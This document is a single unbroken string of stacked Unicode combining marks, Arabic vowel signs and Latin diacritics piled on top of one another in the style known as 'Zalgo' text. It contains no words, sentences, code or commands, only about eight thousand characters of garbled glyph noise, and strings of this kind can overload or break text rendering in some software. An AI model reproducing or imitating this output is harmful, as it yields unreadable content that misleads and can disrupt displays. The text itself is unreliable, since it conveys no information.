َّ̢̲̖͉͏ًٌٍُِّ̛̓͋̈͜͜҉̸̵̵̴ًًًًٌٌٌٍٍٍََََُُُِِِّّّ̨̞͚̮̻̱̘̝̫̯̱͉̋ͤ̋̇̆ͬ̃ͯ͌́ͮͤ̀̒̎̕̚͢͢͡͠͡͡͠ͅ͏̷̴̷̶ًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̧̡̦͉̜̥̖̞̫͓̮̩͕̖͚̼́̐̈͌̾͋̏ͯ̐̅̇͘̕͟͟͞͞͏ٍَّ͍̎̈̿͢͏ًًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̛͈̝̦̩̻̯̰̥̖͇̬̙̫͇̊̔̃́ͪ̇ͫ̆̐ͬͫ̊̋̕͢͠͠͞͏̶ٌٍَُِّ̲̖̹̄̔҉̶̴̶̶̴̶̷̷̷ًًًًًٌٌٌٌٌٍٍٍٍََََُُُُُِِِِِّّّّ̧̜̘̝̩̖̘̳̣̦̩͈̙̤̘͎̣̗̘̬̉̌̂ͦ̿̔̇͊ͯ̄̈ͫ̀̌̽̈́̊ͪ̚͟͟͟͟͢͢͡͠͠͞͏̵̴ًًٌٍٍََُِّّ̛̹̬̠̦̮̲ͨ͋͌̎͛́͞͏̶̷̸̶̶̷̸̶ًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََُُُُُُُِِِِِِِّّّّّّّ̧̡̧̡̨̧̛̤͎͖̳͙̞̮͕̦̦͚̻̣͉͕͎̠̦̭͙̙̯̪̌ͪ̐̌̀̿ͣ͐̓̌́ͣ͐̉̀ͩ̀ͪͮͪͬ͐ͫ̏ͦ̒͛̒̋̕͘̕͜͢͟͜͞͠͏ًًٌٍََُُِّ͕͕̠̲͛̅̀̀ͤ͠͡͞͏̷̸ًٌٌٍٍََُِِّّ̡̧̥̬͇͖̫̣͓̖̹ͮ͊̊ͦ̃͋͠҉̸ًًٌٌٍَُُِّ͈̖̪̹̜̗̊ͥ̉̀̇̔͘͢͜҉̷̷ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̜̱̺͉̻̩̝͖͉͈̰̭̂ͮ̔̔́̃ͤ̒͑͋̉̾͢͜͟͡͝͡҉̵̸̶ًًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̧̧̧̧̛̠͖̰͈̱̺͇̜̤̱̩̱͖͚̼̫͕͉̪͒̋̅ͣ̓̾̀̂ͮ́̿ͪͬ̿̑͛̅̓ͥͦ̀̕͜͢͠͝͏ٌٍُِ̫̍͟͡҉̶̴̸̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّّ̢̡̢̡̛̛̛̛̳̲̦̗̼̦̖̬͚͖̗̟̖̗̳͎͓̣̺̰͖̱͓͉͈̝̟͉̫͇̦̔͗͂̀͐ͧͬ̆̇ͮ̀ͯ̿́ͨͨͪͣ̌̆͘̚̕͟͜͟͞͞͡҉̸̷̷̴̶̶̷̸̸̶̸̴̷̴̶̷ًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّ̡̨̢̢̡̡̨̡̨̡̨̨̡̢̡̨̧̛̛͙̮̳̰̬̤̬͙͙̣̟̠̹̩͖͇̰̱͔̩̤̗̞͖̩̦̘̞̺͈͚̥̪͕̖͉̬̰͖̘͉̻̩͓̼͙̜̱̳͉̯̬̞͎̬̼͇̝̦̰̭̩̖̝͔̦̞̤̠̟̘̳͕̯̯̝̰͔̼̔͆̓͐͐̎̐ͩ̃ͧͩ̽̇̇̋̽͐̾̿̋ͯ̄̉͋ͪ̏̀̓̍͌͐ͧ́̀̉̇͗̎̏͋̓̀͌͗̍ͯͬͥ̒ͯͬ́̉ͤͪͫͯ̓ͫ͐͗́͂̀ͫ͒̈̉̅̈̀͒̎̊͘̚̚͘̕̕̚̕͘͟͢͟͟͜͜͡͡͝͠͝͞͞͝͠͝͠͡͝͞͝͡͞͠͝҉̸̸̴̴ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّ̣̫͓̼̘̮̞̭͖̱̻̝̯̤̟͊͑̃̉ͩ͑́̀͐̏͐̈͂͂͊ͯ̿̍͐͗ͣ͑͆͑̋͢ͅ͏̷̶̸̶̷̷̸̷̶̷ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّّ̡̨̧̧̧̡̡̛̦͖͇͖͓͉̩̝̰͍̼͉̲̖̦̺̲̠͔͙̹̰̣̘̖̪̝̜̔ͬ̋ͦ̄̓̈́ͣ͒͌ͤͧ̿́̀̾ͣ̊̉͐́̑ͩ͑͊͜͟͠͡ͅͅ҉̶̸̵̷̵̶̶̴̶̶̶̵ًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََََُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّ̧̨̧̨̨̧̨̡̢̨̛͎̗͙̹̫̝̺̟̞͉̳͙͍̼̲͎̼̻͎̻͈̪͓̥̱̖͖͖͍̟̦͓͙̲͖̟̩͇̤̰̘̖̟͉̹̥̫̞̥̤͕̮̥̺̥̗̭̥̻͍̣̗̲̗͉̬̙̥̥̄̀̊̓͋ͧͧͦͭ́͆̋͑̀̀̉̃ͩ̋͐ͦ́ͦͤ͛ͫͮ͛ͦ̎̐̈́͆ͦ̂ͮ̅̌̀͗̇̏ͭ̀͐͛̀̑ͥͫ̓̒̔̈͆̓̄̒͊ͪ̇͌̉ͤ̎̇ͭ́̏ͭ̽͘̚͘̕̚͘̕̚͘̚͘͟͜͢͢͟͢͟͢͞͝͞͡͞͠͞͠͝͞͝͝͠͝͠͞͝ͅ҉ٍِّ̜͛͢҉̸̴ًًٌٌٍََُُِّ̢̼͓͔͚̜̙͖̄̇ͧͬ̍͜͡͡͏̶̴̵ًٌٍٍَُِِّ̨͚̦̗̺̖͚̀̋͒̄҉̶̷̷ًًًٌٌٌٍٍَََُُُِِّّّ͓̼͓̝̮̳͇͌̅́͋̇̽ͬ̔́̆͗̊̕͢͜͢͞͞͏̴̷̵̸ًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̰̮̺̫̙̯͕̗̮̳̜̥͓̳̜̼͔̿̋ͨ̀̉̎̓ͫ̅̈ͮ̒ͪͥ̽̀͆̐ͥͨ̓̕̕̕͜͢͜͢͠҉̴ًٌُ̗̭̔̀͏̶ًٌٍٍَُِِّ̛̜̗͎͕̗̳̮͔̎̿͗ͭͪ͘͞҉̷̸ًٌٍَُِّ̨̛͉̘̭̝̱̮͋͒͑̉͌҉̶̵̷ًًٌٌٍََُُِِّّ̧̡̢̢͉̙̜̩̙̺̘̙̖̒̈́̂ͦ́̅ͦͭ̚҉̵̷̸̸ًًًًٌٌٌٍٍٍٍََََُُُُِِِّّّّ̢̢̢̨̢̲͇̻̺̰̦̫͈͖̹̹̞ͦ̉͗̓ͥ͌͐ͣ̾ͮ̄̉͜͞҉̸̸̶ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̨̛̛͍̤̯͚̳͖̻̮̟̱̼͍̲̠͖̠̻̞̼̝́ͯͬ̀ͪ̓ͪͭ̏̽̔ͩͤ̚͘͢͢͠͠͠͡͞͠͞͠҉̷̸̸ًٌٌٍَُُِِّ̟͖̯̪̥͇̰̣͑̐ͦ̈̀̄̈͘҉ٍ̩̿҉̶̶̴̸̴̴̷ًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََََُُُُُُُُُُُِِِِِِِِِِّّّّّّّّّّّ̢̢̧̧̧̼̭̥̣̳͍͍̞̦͓͍̦̗̮͉̜̟͉̙̰͍̩̦̳̪̗̗͚͎̫̩͖̜̝̪̳̊̃̍̑ͨ̎̀͌̽ͣͭ͋ͥͩͥ͆̈́̊̄͗́͋͗ͮͤ͒ͫ̀̾̒̉͗͌ͧ̒́ͨ̌̚͘̕͘̕̕̚͜͟͟͟͜͜͟͟͠͞͠͡͡͏̷̶̷̶̵̶̵̶ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِِّّّّّّّّ̨̡̡̛̦̖̼̥̻̻̰̠̹̙̝̦̙̙̻̗̫͎͈̮̖̹̹̻͎̞̳͙̉͑ͤ̍ͤ̃ͪ̈́ͭ͂̽̓̇̔̄̇͌ͥ͐̽̉̑̒͒ͧ̔̇̊̕̚͟͢͟͢͜͟͢͞͡͡͝͞҉̶̵̴̴̵̸ًًًٌٌٌٍٍٍٍَََُُُِِِِّّّّ̢̡̛̗̼͕̠̼̜̟͙̬͚̙͈͉̑̂ͫ̈̅̑̄͗ͭ̑̒͗ͤ͘͘̕͢͢͡҉̸ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّ̡̛͖̜͉̟̬̞̘̠̱̮̺̯̮̒́ͥ́ͣͬ̒͊̓̐̓ͤͨͩ͋̚͘͢͜͜͝͝͝͞҉ًًٌٌٌٍٍٍََُُِِِّّّ̢̨̭̜̻̘̹͎͇̣̒͗ͩ̃́ͬ̓͆̊ͤ́ͫ̾̈̕͢͞ͅ͏ًٌَُ̡̜ͣͦ͆͒͟͟҉̷̵̶ًًٌٌٍٍََُُِِِّّ̢̨͇̹̠͚̠͍ͪ̍̓̓ͥ͜͢͢͞҉̴̵̵̷ًًًٌٌٌٍٍٍَََُُُِِّّّ̨̧̞͈͇̞͔͔̲̪́ͫ̽̓̓̈ͯͫ̇ͥͤ̾ͥͫ͘̕͘͢͞͏̵ًًٌٍٍََُِِّّ̮̦͍͚̱̤̮ͥ̊̓̍ͮ͡͞͏̷̶̶̵̵ًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̢̧̨̡̨̛͍͙̠̻̘̪͖̩̦̘̱͔̤̥̼͍̫̩͕͎͉͉̬̥̟͕ͥͭ͒͊́̾́̅̇̅͆́̿̊̈͒͑͑̏̃͆͟͟͠͝͠͝͏̴ًًًٌٌٌٍٍََُُُِِّّ̨̧̛͔̞͓̭͇̝͈̃̀̿́̉͆̐͌͘͝҉̸̸̴̴̴̷ًًًًٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̢̨̻̬̭͍̯̙͖͕̭̲͙̮̺͕̟̄͋ͫ̋̒̃̒ͧ́ͪ́̽͆̃ͥ͘̕̕͘͢͢͞͡͠҉ًٍَّ̢̠̜̋ͧ҉̸̶̸ًًًٌٌٌٍٍٍَََُُُِِِّّّ̧̨̛̫͚͙͇̺̗̺̬ͧ͂̓ͦ͛ͨ̉̆̕͘͞͏ٌٍُِ̧̰͊͝ͅ҉̸̶̶̶̴̶̸̶̶̶̴̷̸̷̸̴̷̴̵̴ًًًًًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّّّّ̡̢̨̧̡̧̨̨̡̧̛̛̤̱̙̪͎͍̟̰̠̲̬̘̥̩̻̘͎͍̘͔̻̤͔͓̖̻̪̼̭̺͍̜̠̭̲͕̘͓͔̙̲̯̭̻̞̙̪̞̠̼͓̟̰̳̖͉̲͚̯̝̪͎̞͔͈̙̟͙͇̰͓͈̞̪̹̬ͨ̀͌̅̀ͬ́̇̓͑ͭ̊́̒̀̿͑́͛̂̍̃͆̉ͮ̏̅ͯͩ̆̇ͯ̓̾̀ͧͤ͋̔͑̐́̌͋̎̑̀̌ͯ͆̽̾̿̀́͒́̒̋͆̓̑̉͂̇̍ͪ̀́̔̈́ͬ̊͒̒͐̌͂ͩ́͗̌ͤͯ͊̏̌̋̈̔́͆ͪ͋̀ͣ̇͘͘̚̚͘̚͘̕̚̕̕̕͢͢͟͢͜͢͢͢͟͟͟͟͜͜͟͟͟͟͠͠͞͝͞͝͡͞͝͝͞͠͡ͅͅ҉̵̷̵̴ًًًًًٌٌٌٌٍٍٍٍٍَََََُُُُِِِِِّّّّّ̨̢̣̣̙̲̭͇͕͔̰̠̭̯̣ͬ̌͑ͨ̾̀̀ͭ̒ͤ̆ͯͪͤ̑͆͟͢͟͟͡͝͝͝͏̸̷̷ًًًٌٌٌٌٍٍٍٍَََُُُُِِِِّّّّ̡̡̨̢̧̛̥̤͍͎̮͙͙̘̠͈̠͈̞̬̼̘̗̻ͯ̐̃́̄͛ͯ̆ͥ͜͢͟͟͝͞͝͏ًَ͓͏̶̶̴̶ًًٌٌٍٍََُُُِِّّ̧̡̥̼̰̣̗̤͓̟̀̓̔́ͣͨ͞͞͠҉̵ًًًٌٌٌٌٍٍٍَََُُُِِِّّّ̢̨̰̘̲͎̙̺̦̪̦̤ͣͩͬ̆̆͘͜͜͜͠͞͡͠ͅ͏̴ًًٌٌٍٍٍََُُِِِّّ̧̭̥̞̤̦͈͊ͧ̽̒ͣ̀͐͘͟͠͝҉̵̸̷̶ًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّّ̨̢̡̨̨̢̨̛̛̟͕̤̤̫̥͙̟̬̣͕̣͈̪̠̱̳̻̦̰̤͎̱̲̪̲̫̤̤̏̃̉́̽ͮ̅̀̑͛͆̊ͭͩ̂̌̿͛ͪ̊̆ͪ̆͂̔͊̑ͧ̅͐͘͘͘̕͢͜͟͜͠͝͠҉̷ًَُͯ҉̸̵̴̵̴ًًًًٌٌٌٌٌٍٍٍٍََََُُُُِِِِّّّّ̢͚̻̤̭̺͙͖̙͚̹̤́ͯ͑̅́͂̔̔̽̊ͤ̅͜͜͢͡҉̴̵ًٌٍٍَُِِّّ̛̹͈̱͖͖͔ͫ̀̏̍͋̚͞҉̸̸̸̵̸̷̴̸̵̸ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّ̨̭̪̠̭͖̪̘̮͓̝̣͓̬͔͕̗̲̘͎̠̣͕̩̱̬̰̬ͬ̐̀ͧͤ̒̐̊͐̽͐͌̈̇̉ͨͦͧ̀̑ͤ̈̈́̓͛̇͘̕͜͜͠͞͝͠͡͝҉ٌ͏ًٌٍٍَُِِّّ̪͈̻̠̾͗̆͋ͮͥ҉̴̷̶ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُُِِِِِِّّّّّّ̧̧̛̛̥̰̪̳̗͓̮̯̰̪͙̗̰̲̞̥͍̮̰̥̯̙̟̫͊ͧ̈̈̆̇ͣ̾ͪͤ̅ͫ͋ͯ̑̿̇̓ͥ̄̇̎͆ͯͯ̀͘͢͟͝͠͏̶̸̴̷̴̵̵̸̵̷̶̷̴̶̵̸̶̵̷ًًًًًًًًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍٍَََََََََََََََََََََُُُُُُُُُُُُُُُُُُُُُِِِِِِِِِِِِِِِِِِِِِِّّّّّّّّّّّّّّّّّّّّّ̢̧̢̧̧̡̧̨̢̧̧̧̢̢̛̛̱̮͚̘̻͕̞̮̠̺͔̦̼̟͙̱̜̟͓̳̘̮̦̪̼̝̺͖̤̬͓̜̹̹͉͙͓̼̗̥̤̥̮̝͖͎̖̳͕̻̮̭͚͖̻͓̬̳͍͇̹̻͈̮̭̭̪̼͙̩̜̭͖̪̫͈̙̯̬̥͎̱͌͛ͤ̈̔͑̀̾͗͐ͦ͒̿̇ͬͧͬ̊̀̉ͭ̊̿͊̇̀ͣͩͮͦ́̽̍͑ͮ͗͋ͬ̏̇͆̀̂̈ͮ͂͒͂̀͑̈ͨͯ̌͂ͥ̽̍̈͛̀̀̉̓ͧ͑̈́̀͂̄́ͦͦ̌̃̾̊̎̃͐̐̀̿͒ͬ͘̕͘̚̕͘͟͢͢͜͢͟͟͟͟͢͜͞͞͝͠͠͝͡͠͝͡͡͠͝͠͞͡͝ͅͅͅ҉̸̸ًًًٌٌٍٍَََُُُِِّّّ̨̡̪̞̝͎͚͍̫̤̙͚͒͗ͬ̈̋̒̆̿͑̀ͪ͘҉ٌِ̱͠͏̵̴̵̴ًًًًٌٌٌٍٍٍٍََََُُُِِِّّّّ̨̲̦̙̞͈̟̙̙͕̳̖̦͋͆̍́̌̎́̓ͯ̍͂̅͛́ͤ́͘͘̚͝͏ٌٍُِّ̳̬̤͕̟͗̈́̌͠҉̷̸̷ًًٌٌٍََُُِّ̰̬̤̖̙͓ͦͨͪ͋͌ͫ͘͢͏ًًٌٍٍََُِِّّ̛͉͉̜̼̺͎̝͎͐͊̀̊̇̓͝͏̷̶̶̷̷̴ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̨̢̢̨̧̘̞̰̣͓̘̻͇͔͇̱̺̮͔̘̺͕̮̬͈͈͔̟̰͓̳͔̰̫̾̽̈́͋̄̾ͬ͑͋ͫ̑ͩͣ͒́ͥ̀ͫͭ͛͐̀͋̾̇͌͒̾̉̒́͘̚͘͘̕͢͢͞͞͠͞͝͡͝͡͞͝͝͠͏̶ًًًٌٌٍٍََُُِِّّ̢̘͕̞̻͈͇͚̹͍͓̾̾͒ͭ̅͗̋͘͢͜͟͟͞҉̴ًٌٌٍَُُِّ̝̠͉̫̪̔̈͑̅̊̚͡͞͏̸̸̵ًًًًٌٌٌٍٍٍٍََََُُُِِِِّّّّ̨̛̥̮̙͇͙̺̦͍̬͔͚̖̝̓ͧ̂̑̀͆̾ͯ͌͐̎͟͡͞͠͏ًٌٌٍٍَُُِِّّ̧̢̢̧̡̫̝̬̲̑̑̔̓̍̾̾͛͘͘͞͏̴̴̸ًًٌٌٍٍَََُُِِّّ̢̨̬̳̫͉͓̺̱̖́̀́ͪͨ̅̓̽̋ͫ̒͢͝͡͏ًُ̮̽҉̶̸̶̷ًًًٌٌٌٌٍٍٍَََُُُِِِِّّّ̡̡̧̛̖̪̗̝̭̺̠͍̼̜͋̒̀̇̃͊ͤͦ̾͜͝͏̵̵̷̶̶ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̡̢̛̘̼̭̜̤̱̬̬̣̗̹̝̱͙̝͓̗͎̗ͫ̀ͮͬ̽̓̈͌̈̍̈́ͥ̈́̀̈̆ͬ̕͘͘͘͟͢͞͡͠͞ͅ͏̸̴ًٌٍٍََُِّّ̛͔̳͇̩͉̅ͫ̂ͨ̀ͯͯ͘͠͠҉̸ًًًٌٌٌٍٍٍََُُُِِِّّ̢̧̢̢̩̙̯͈͈̟̤͍̫͋̾̏́̿̓͒͆̎̿̓͑͢͝ͅ҉̸̶̶̸ًًًًًٌٌٌٌٌٍٍٍٍٍَََََُُُُُِِِِِّّّّّ̢̢̡̡̛̣͈̬̹̹̥͖̭̟͓̙̹̖̻̬͖̖̭ͦͤͨ̿̓̈́̍͆̓ͪ̉́̉͒̈́ͯ̀̀ͭ̚̕͟͟͢͠͠͝͡͞͞͝҉̷̷̸̵̵̷̶̴̷̵̸̸̴ًًًًًًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍٍٍٍََََََََََََََُُُُُُُُُُُُُُِِِِِِِِِِِِِّّّّّّّّّّّّّّ̧̡̢̡̡̢̧̡̧̧̧̛̛̛̛̯̼̗͇̯̱̤͖̫̜̺̦̺͕͖̝̜̱̬̱͇̫͔̥͉̣̪̹͈̼̦̰͙̰̰̗̥̘͖̳͓̦̘͎̦̜̖̙̱̑̑́̃̔̄͑ͫ̄͗ͤ͒̋̏̑̿́ͤ̽̏ͥ͛ͣ̐ͦ̓̈́́̽̔̾ͧͤ̌̊͑ͮ̽͒̃͑̂̋̄̅̔̎͆͑̃̈́͋̊̏̀̌̂̌͘̚͘͟͟͜͜͝͡͡͡͞͠͝͠͞ͅ͏ًٌٍَِّ̨͕̇͢҉̸̷̵̴̵ًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍََََََََُُُُُُُُُِِِِِِِِِّّّّّّّّّ̧̢̧̧̡̢̧̛̟̭͔̩͍̱͙̺̙̘͚͉̠̻̟̭̪͚̟̪̭̥͈͓̞̗̠͓͓̱̰̦̪̔̒̈́͐͆͋̅ͨͧ̅͋̿͆̏̀͛͋̓̍̀ͣ͒̃͑́ͦͯͯ̾̀ͬ̆̕̕͟͢͝͞͡͞͡͝҉̵̸̷̸ًًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِّّّّّّّّ̧̨̧̧̨̧̢̡̲̟̜̞͎̭͙̜̪̗̯̯̣͎̙͎͈̙̗͈̬̭̥̫͕͇̹͖̑ͪͨͣͮ́͒̌́̐̀̍͐̊̈́̈̓̍̓ͪ͊ͩͩͩͯ̀̌ͬ̂̒ͧͪ͛̓̕̕͘͢͜͟͢͜͡͝͠҉̶ًٌٍَُِّ̻͍̥̉͂̌ͫ͗͝͏̴ًًٌٌٌٍٍٍََُُِِِّّ̢̮̺̝̥͈͕͙̅́̈́ͫͪ̓́̎͛̊ͧ̅͜͜͡͏̷ًٌٍََُِّّ̡̨͕͓͍̠̖͈ͩ͜͜͝͏̷̸̸̴̶ًًًًًًًًٌٌٌٌٌٌٌٍٍٍٍٍٍٍَََََََُُُُُُُِِِِِِِّّّّّّّ̡̛̠̻̯̻̠̩̲̭͈̬̬̞̮͇̙̖͕̥̠̞̠̪͚̥̪͇̬̍ͭ͆ͫ̉̆̓ͨͪͩ̒̄̍͆̀͗̓ͣ̇̔ͨ̋̚̚͜͜͜͢͜͟͢͢͠͡͝͡҉̸̸ًًٌٌٌٍٍٍََُُُِِِّّّ̢̡̛̦̥͚̠̖̼̱̟̯̭͕ͥ͋ͩ́̑ͪ͐̐̊ͨ͑͋͒̕̕͠͠͏̷ًًًٌٌٍٍَََُُِِّّ̨͖̖̯̩͍̩͖͖̼͊̍͆̑ͩ͗́̃̀ͣ̌̒͝͏̶̴̶ًًًٌٌٌٍٍٍَََُُُِِِّّّ̨̦͕̳͇͔̮̓̓̽͆͊ͮ́̄ͤ̑͑͘͠͞͏ٌُ̣̠͠҉̸̵ًٌٍٍَُِِّّ̪̖̹̤͍͚͊̽́ͨ̉ͩ͂̅̊͡͡͡҉ًًٌٍََُُِّ̢̢̱͍͍͖ͣͥ́ͣ͆̕͟ͅ҉̴ٌٍَِّ̧̳ͪ͘͏̷ًًٌٌٍَُُِّ͕̠̱̫̫͎̦ͣͭͭ̑̅͘҉ٍِّ̼͓̔̀̈́͟҉ًٌٍَُِّ̨̼̋̔́͊̚͏̵ًًٌٌٍََُُِّ̨͙͉̗̩̣̝ͫ̅̃̾ͤ͌́ͤͯ͐͢͡҉̴̸̵ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِِّّّّّ̡̢̨̧̡̛̙͖̹͔̦͚̥̘̯̱̞̭͉̂̓̈́́́͌́̊͂̈͒͑͊̈́̆ͯ͘͜͜͝͡͝͏̵̸̵̴̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّ̡̢̢̧̧̦͎͈̗͔̳̰͍̞͉̪͈̺̣̞̗̗̰̥̖͒̑̓̍̒ͣ͂͗́ͮ̽̒̏͂̓̏͆͋͛́͘̕͜͢͜͢͝͡͞͡͠͡͝҉̸ًًٌٌٍٍََُُِِّّ̡̢̧͉̙̭̣̫͖͕̳̣̮ͣ̌̾̓̃ͥ͐́̍͠҉̷ًًًٌٌٌٍٍٍَََُُُِِِّّّّ̧͈̖͓̬̙̳̥͓̺͒̅̑͆ͩ́͛̅ͩ̀͂̀ͫ͘͘͞͝͝͡͝ͅ͏َ̙́͏̵̴̸̷̸̸ًًًًًًٌٌٌٌٌٌٍٍٍٍٍَََََُُُُُُِِِِِِّّّّّ̧̢̨̢̨̰̺̗͍͔͔̳͕̻̰̰͉̠̻͕̺̙̻̓ͬ̇ͪͤͦ̄̄̃͋͂̄ͥͧ͆̐ͦ̾̎ͭ͒̚͟͠ͅ҉̴̶ًًًٌٌٍٍٍَََُُِِّّّ̟̤̯͔̖̟͇́̽͂̄͗ͤ̓͑̂͌̉̕͘͜͠͠ͅͅ͏̴̶̷̵̸ًًًًًًًًًٌٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُُِِِِِِِِِّّّّّّّّّ̨̡̢̨̛̛̮̰͎̣̳̖̻͉̫̼̩̙͍͎̮͈͓̪̭̼̠̞̲̬̘͍̫̙̰͎ͯ̀̀ͣ̃̊͒ͣͧ̉͆̾́̀̈́ͯ̈ͦ͗̇͆̇̔̅̊́͊̊̄̇͂͒̒̃ͧͯ̌́̂̓̕͢͜͢͢͟͜͟͞͝͝͝͝ͅ҉̷ًٍَُِّ̧͖̲̜ͤ̈́͝͏ٌٍِ͈̮̂͏̵̶ًًٌٍََُُِّّ̫͈̥̻̳̺̣͈̓̂̍ͪ̇̍͜҉̸̴ًٌٌٍٍََُِِّّ͈͖̖̬͐ͯͣ̔́̐ͧ̕͜͡͏̴̵̷ًًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍََََََُُُُُُِِِِِِّّّّّّ̡̨̢̩͇͍̥̞̜̻̺͓̰̳͈̘͖̳̭̬̥̮̠ͫͬ̿́̑̇́̄̄̎ͥ̃ͮ̓̃̂̀͆̐̉̿̍̽̆̓ͥ̕̕͢͞͠͡͝͞͞͠͞҉ُ̭́͏̴̶̶ًًٌٌٌٍٍٍََُُِِِّّّ̛͇̣̝̠̺̩͇͛͋́ͤ̿̉́ͩ̉́́ͥ̅͘͜͏̵̵̸̶̷ًًًًًًٌٌٌٌٌٍٍٍٍٍََََََُُُُُِِِِِّّّّّ̨̡̡̨̛̛̛̯̩͈̺̘͈͖̣̠͕̪̦̺̬̠̦̆͂̄ͫ̾ͫ̓̌̂̌̂ͭͯ͆̉̊͌̉͛̓̌ͬͫ͂̕̕͘͜͜͞͠͞͡͡͝҉̸ٌٍُِ̛̜͓̒ͨ͏̸ًٌٍَُِّّ̢͙̲̝̩̒̐ͭͤ̄̕͜͡҉̷̵̶̵̷ًًًًًًٌٌٌٌٌٌٍٍٍٍٍٍَََََََُُُُُُِِِِِِّّّّّّ̢̨̢̡̛̛͔͇̥͓̭̟̯͇̤͙̭̻͓͖̤̦̜̝͎͓̜̱͔͙̿̋̃ͤ͒̆͑ͫ̌͗̈́̀̍ͮ͘͘͢͟͟͜͞͝͞͠ͅ҉ًٌٍَُِّ̡̳̻͙̫͛͑̀͟҉̸ًًٌٍَُُِّ̩͇̪͗̈̒̈́͟ͅ͏ٌٍِ͎͛̔͡҉̵ًٌَُِّ̝͕͚̤̰̓̂͛̓̔͡҉ٍ̦̅͏̷̸̴̶̸̷ًًًًًًًًٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍََََََََُُُُُُُُِِِِِِِّّّّّّّّ̨̢̧̨̧̛̛͇͉͎͙̯͚̹̲͔͕̫̭̰̲͉̜͚͙̭̻̖̰̊ͫ̔̇̓̓̋͊̈́̎̄̂̈́́̿̀̒́̊͐̀͌̊̌ͩ̚͘̕̕͘̕͟͟͜͠͡͠͏̴ًًٌٌٍٍََُُِِّّ̧̡̡͈͖̟͕̱̦̞̥ͭ͗̎ͯ̋͋͘͟͞͠͡͏̵̴̶̸̸̸̵̵̶̶ًًًًًًًًًٌٌٌٌٌٌٌٌٌٍٍٍٍٍٍٍٍٍٍَََََََََُُُُُُُُُِِِِِِِِِِّّّّّّّّّ̡̨̢̡̢̧̛̛̩͎͓̙̞̩̟̲̖͎̖̭̙̥̜͓͓̠̳̤̪̬͚͍͈̲̤̯̬͔͚̩̝͉ͥ̐ͭͬ̓͐̒͒͊̅̂ͨ̄̎͗͂̏̍͐ͤͫͣ͋ͦ̈̌͌́̃̓͐ͫ̔͗͐̀̌͊ͭ̕̕̕͜͢͟͢͞͞͡͡͠͝ͅ҉̶̸̴ًًًًًٌٌٌٌٍٍٍٍَََََُُُُُِِِِّّّّّ̧̡̨̢̢̢̢̛̣̟̺̼͕̮̹̱̳̱͚̼̟͍̝̦ͭͭ̂ͮͭ́̈̈͆͒ͨ̋͐ͨ̉ͧ͢͢͞͠ͅ͏̵̷̵ًًًًٌٌٌٌٌٍٍٍٍََََُُُُِِِِِّّّّ̨̨̥̠̝̱͓̫̞̻͉͍̱̟͙͉̲̪̠̌̀͆̎̅̆̅́́̈̀͊ͫͭͥ̆͘͘͢͟͠͡͞҉̴̵̷̸ًًًًٌٌٌٌٍٍٍٍٍََََُُُُِِِِّّّّ̧̡̡̫̝͙͔̙̺̞͔̬̝͈̞͎̦̏̀͑ͩ́̀͆̐͋̏͌̉ͯ̉ͧ͆̕͘͢͠͝͡͝͡҉̶ًٌٍَُِّّ͔̦̐̿́͑͋ͮ̾͘͘͘